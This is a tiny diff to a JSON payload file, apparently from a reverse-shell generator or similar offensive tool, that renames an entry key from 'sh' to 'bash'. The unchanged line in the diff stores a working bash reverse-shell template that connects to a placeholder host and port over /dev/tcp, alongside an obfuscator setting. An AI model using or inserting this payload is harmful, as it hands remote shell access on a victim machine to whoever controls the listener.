@@ -1,5 +1,5 @@
 {
-    "sh": {
+    "bash": {
         "raw": "/bin/bash -c '/bin/bash -i >& /dev/tcp/{HOST}/{PORT} 0>&1'",
         "obfuscator": "default"
     }
